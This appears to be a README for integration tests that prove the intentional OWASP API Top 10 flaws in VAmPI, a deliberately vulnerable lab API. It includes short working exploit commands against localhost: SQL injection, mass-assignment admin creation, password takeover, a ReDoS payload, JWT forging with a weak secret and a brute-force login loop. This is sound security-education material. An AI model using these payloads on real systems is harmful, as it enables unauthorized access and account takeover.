# VAmPI Integration Tests

Comprehensive integration tests that demonstrate and prove the vulnerabilities in VAmPI (Vulnerable API). These tests are designed for security education, tool evaluation, and vulnerability validation.

## Overview

These tests are **proofs of concept** for the OWASP API Security Top 10 vulnerabilities intentionally built into VAmPI. Each test file focuses on a specific vulnerability and includes detailed documentation explaining:

- What the vulnerability is
- Why it's dangerous
- How to exploit it
- How to fix it

**Important**: These tests are designed to PASS when vulnerabilities are present (when `vulnerable=1`). Passing tests mean the vulnerabilities are exploitable.

## Test Coverage

| Test File | Vulnerability | OWASP Category | Severity |
|-----------|--------------|----------------|----------|
| `test_01_sqli.py` | SQL Injection | API3:2023 | Critical |
| `test_02_mass_assignment.py` | Mass Assignment | API6:2023 | High |
| `test_03_bola.py` | Broken Object Level Authorization | API1:2023 | Critical |
| `test_04_unauthorized_password_change.py` | Unauthorized Password Change | API1:2023 | Critical |
| `test_05_user_enumeration.py` | User/Password Enumeration | API2:2023 | Medium |
| `test_06_regex_dos.py` | Regular Expression DoS | API4:2023 | High |
| `test_07_excessive_data_exposure.py` | Excessive Data Exposure | API3:2023 | Critical |
| `test_08_weak_jwt.py` | Weak JWT Secret | API2:2023 | Critical |
| `test_09_no_rate_limiting.py` | No Rate Limiting | API4:2023 | High |

## Prerequisites

### Environment Setup

The tests require a running VAmPI instance with bootstrapped data. The recommended setup uses Docker Compose:

```bash
# Start VAmPI with bootstrap
make up

# Verify API is running
curl http://localhost:5000/
```

### Test Dependencies

**Quick Setup (with uv - recommended):**

```bash
cd integration-tests
./setup-uv.sh
```

Or traditional setup:

```bash
cd integration-tests
pip install -r requirements.txt
```

Dependencies:
- `pytest` - Testing framework
- `requests` - HTTP client library
- `PyJWT` - JWT encoding/decoding for weak secret tests
- `pytest-timeout` - Timeout support for ReDoS tests

**Using uv?** See [UV.md](UV.md) for detailed uv documentation and advanced usage.

## Running the Tests

### Quick Start (3 Ways)

| Method | Command | Pros | Best For |
|--------|---------|------|----------|
| **Local Script** | `./run-tests.sh` | ✅ No docker exec needed<br>✅ Auto-uses uv if available<br>✅ Auto-installs deps<br>✅ Works inside & outside Docker | Most users |
| **Make + Docker** | `make test-integration` | ✅ Isolated environment<br>✅ No local Python deps | CI/CD, clean environments |
| **Manual with uv** | `cd integration-tests && ./setup-uv.sh && pytest -v` | ✅ 10-100x faster installs<br>✅ Full control | Developers (recommended) |
| **Manual Traditional** | `cd integration-tests && pip install -r requirements.txt && pytest -v` | ✅ Works anywhere<br>✅ Use existing Python env | Fallback option |

**Option 1: Local Script (Recommended - No Docker exec needed)**
```bash
# From project root - automatically installs dependencies
./run-tests.sh

# Or using Make
make test-integration-local

# With custom pytest args
./run-tests.sh -vv -s
./run-tests.sh test_01_sqli.py
./run-tests.sh -k "admin"
```

**Option 2: Inside Docker Container**
```bash
# From project root
make test-integration

# Or with verbose output
make test-integration-verbose

# Or manually
docker exec vampi-tools pytest integration-tests/ -v
```

**Option 3: Manual Local Setup**
```bash
# From integration-tests directory
cd integration-tests

# Install dependencies (first time only)
pip install -r requirements.txt

# Set API URL if needed
export VAMPI_BASE_URL=http://localhost:5000

# Run tests
pytest -v
```

### Running Specific Tests

```bash
# Run a single test file
pytest test_01_sqli.py -v

# Run a specific test function
pytest test_01_sqli.py::test_sqli_basic_or_injection -v

# Run tests matching a pattern
pytest -k "enumeration" -v

# Run with verbose output and print statements
pytest -v -s
```

### Test Options

```bash
# Stop on first failure
pytest -x

# Show detailed output
pytest -vv

# Show test durations
pytest --durations=10

# Run in parallel (requires pytest-xdist)
pytest -n auto
```

## Configuration

Tests can be configured via environment variables:

| Variable | Description | Default |
|----------|-------------|---------|
| `VAMPI_BASE_URL` | Base URL of VAmPI API | `http://localhost:5000` |
| `BOOTSTRAP_USERS` | Number of test users | `50` |
| `BOOTSTRAP_BOOKS_PER_USER` | Books per user | `5` |

Example:

```bash
# Test against different URL
export VAMPI_BASE_URL=http://vampi:5000
pytest -v

# Or inline
VAMPI_BASE_URL=http://vampi:5000 pytest -v
```

## Test Details

### test_01_sqli.py - SQL Injection

**Vulnerability**: Raw SQL queries without parameterization in `models/user_model.py:71-78`

**Tests**:
- Basic OR-based injection (`' OR '1'='1`)
- SQL comment injection (`admin'--`)
- UNION-based injection
- Boolean-based blind SQLi
- Extracting all users via SQLi

**Impact**: Attackers can bypass authentication, extract sensitive data, modify or delete data.

**Example Exploit**:
```bash
curl http://localhost:5000/users/v1/admin%27%20OR%20%271%27=%271
```

---

### test_02_mass_assignment.py - Mass Assignment

**Vulnerability**: Accepts `admin` field in user registration at `api_views/users.py:60-66`

**Tests**:
- Creating admin user via registration
- Verifying admin privileges
- Using admin token to delete users

**Impact**: Any user can register as admin, gaining full privileges.

**Example Exploit**:
```bash
curl -X POST http://localhost:5000/users/v1/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"test","email":"h@test.com","admin":true}'
```

---

### test_03_bola.py - Broken Object Level Authorization

**Vulnerability**: No ownership verification in `api_views/books.py:50-60`

**Tests**:
- Accessing other users' books by title
- Enumerating books across users
- Verifying own book access works

**Impact**: Any authenticated user can access any book if they know the title.

**Example Exploit**:
```bash
# Login as user1, access user2's book
curl -H "Authorization: Bearer <user1_token>" \
  http://localhost:5000/books/v1/User2SecretBook
```

---

### test_04_unauthorized_password_change.py - Unauthorized Password Change

**Vulnerability**: Uses URL parameter instead of token identity at `api_views/users.py:186-192`

**Tests**:
- Changing another user's password
- Changing admin password as regular user
- Account takeover chain attack

**Impact**: Any authenticated user can change any other user's password, leading to complete account takeover.

**Example Exploit**:
```bash
curl -X PUT http://localhost:5000/users/v1/admin/password \
  -H "Authorization: Bearer <user1_token>" \
  -H "Content-Type: application/json" \
  -d '{"password":"newpassword"}'
```

---

### test_05_user_enumeration.py - User/Password Enumeration

**Vulnerability**: Different error messages reveal user existence at `api_views/users.py:101-110`

**Tests**:
- Valid username + wrong password: "Password is not correct"
- Invalid username: "Username does not exist"
- Systematic username enumeration

**Impact**: Attackers can enumerate valid usernames, then focus brute-force attacks on real accounts.

**Example Exploit**:
```bash
# Check if username exists
curl -X POST http://localhost:5000/users/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrong"}'
# Response: "Password is not correct for the given username." = user exists!
```

---

### test_06_regex_dos.py - Regular Expression DoS

**Vulnerability**: Catastrophic backtracking in email regex at `api_views/users.py:143-160`

**Vulnerable Pattern**: `^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@{1}([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,9})$`

**Tests**:
- Malicious email causing slow response
- Response time grows exponentially
- Valid emails process quickly (control)

**Impact**: Causes CPU exhaustion and denial of service with specially crafted email strings.

**Example Exploit**:
```bash
# This email causes catastrophic backtracking
email="a--------------------a@--------------------!"
curl -X PUT http://localhost:5000/users/v1/name1/email \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$email\"}"
```

---

### test_07_excessive_data_exposure.py - Excessive Data Exposure

**Vulnerability**: Debug endpoint exposes passwords at `api_views/users.py:24-26`

**Tests**:
- `/users/v1/_debug` returns all users with passwords
- No authentication required
- Comparison with normal endpoint

**Impact**: Plaintext passwords for all users exposed to unauthenticated attackers.

**Example Exploit**:
```bash
# No authentication needed!
curl http://localhost:5000/users/v1/_debug
# Response includes: {"username":"admin","password":"pass1","admin":true}
```

---

### test_08_weak_jwt.py - Weak JWT Secret

**Vulnerability**: JWT secret is `'random'` in `config.py:13`

**Tests**:
- Decoding tokens with weak secret
- Forging tokens for any user
- Token tampering (change username to admin)
- Brute-forcing the secret

**Impact**: Complete authentication bypass - can forge tokens for any user including admin.

**Example Exploit**:
```python
import jwt
import datetime

# Forge admin token
payload = {
    "exp": datetime.datetime.utcnow() + datetime.timedelta(seconds=300),
    "iat": datetime.datetime.utcnow(),
    "sub": "admin"
}
token = jwt.encode(payload, "random", algorithm="HS256")
# Use this token to access API as admin!
```

---

### test_09_no_rate_limiting.py - No Rate Limiting

**Vulnerability**: No rate limiting on any endpoint

**Tests**:
- Unlimited login attempts (brute-force)
- Unlimited registration (spam)
- Unlimited API requests (scraping)
- Concurrent request handling

**Impact**: Enables brute-force attacks, user enumeration, data scraping, and denial of service.

**Example Exploit**:
```bash
# Brute-force 1000 passwords in seconds
for i in {1..1000}; do
  curl -X POST http://localhost:5000/users/v1/login \
    -d "{\"username\":\"admin\",\"password\":\"pass$i\"}"
done
```

## Test Credentials

Default credentials created by bootstrap:

| Username | Password | Admin | Usage |
|----------|----------|-------|-------|
| `admin` | `pass1` | Yes | Admin user tests |
| `name1` | `pass1` | No | Primary test user (user1) |
| `name2` | `pass2` | No | Secondary test user (user2) |
| 50+ generated | Various | 10% admin | Bootstrap data |

## Expected Results

When running against vulnerable VAmPI (`vulnerable=1`):

```
======================== test session starts =========================
integration-tests/test_01_sqli.py::test_sqli_basic_or_injection PASSED
integration-tests/test_01_sqli.py::test_sqli_comment_injection PASSED
integration-tests/test_02_mass_assignment.py::test_mass_assignment_create_admin_user PASSED
...
======================== 50+ passed in 30.00s ========================
```

**All tests passing = vulnerabilities are exploitable** ✅ (by design)

If tests fail, it means:
- The vulnerability has been patched (when `vulnerable=0`)
- The API is not running
- Bootstrap data is missing
- Network/configuration issues

## Troubleshooting

### API Not Accessible

```bash
# Check if API is running
curl http://localhost:5000/

# Restart services
make restart

# Check logs
make logs
```

### Bootstrap Data Missing

```bash
# Re-run bootstrap
make bootstrap

# Verify data exists
docker exec vampi-tools sqlite3 /vampi/database/database.db \
  "SELECT COUNT(*) FROM users;"
```

### Token Expiration

JWT tokens expire after 300 seconds (5 minutes) by default. If tests fail with 401 errors:

```bash
# The fixtures obtain fresh tokens for each test
# Check token lifetime setting:
docker exec vampi-vulnerable env | grep tokentimetolive
```

### Timeout Errors

Some tests (especially ReDoS) may timeout on slow systems:

```bash
# Increase timeout in pytest.ini or skip timing-sensitive tests
pytest -v --timeout=60
```

## Integration with CI/CD

Example GitHub Actions workflow:

```yaml
name: VAmPI Integration Tests

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2

      - name: Start VAmPI
        run: docker-compose up -d

      - name: Wait for API
        run: |
          timeout 30 bash -c 'until curl -f http://localhost:5000/; do sleep 1; done'

      - name: Install test dependencies
        run: |
          pip install -r integration-tests/requirements.txt

      - name: Run integration tests
        run: |
          pytest integration-tests/ -v --junit-xml=test-results.xml

      - name: Publish test results
        uses: EnricoMi/publish-unit-test-result-action@v2
        if: always()
        with:
          files: test-results.xml
```

## Security Considerations

**IMPORTANT**: These tests demonstrate real security vulnerabilities. Follow these guidelines:

1. **Never run these tests against production systems**
2. **Only test systems you own or have permission to test**
3. **These tests create data, modify passwords, and stress the API**
4. **Use isolated test environments only**
5. **Do not use these techniques against systems without authorization**

## Contributing

When adding new tests:

1. Follow the existing file naming pattern: `test_XX_vulnerability_name.py`
2. Include comprehensive docstrings explaining the vulnerability
3. Add both exploit tests and control tests (baseline behavior)
4. Reference OWASP documentation
5. Include example exploit commands in docstrings
6. Update this README with the new test details

## Resources

- [OWASP API Security Top 10 2023](https://owasp.org/API-Security/editions/2023/en/0x00-header/)
- [VAmPI GitHub Repository](https://github.com/erev0s/VAmPI)
- [Pytest Documentation](https://docs.pytest.org/)
- [Requests Documentation](https://requests.readthedocs.io/)

## License

These tests are part of the VAmPI project and follow the same license.

---

**Remember**: The goal of these tests is education and awareness. Use responsibly! 🔒
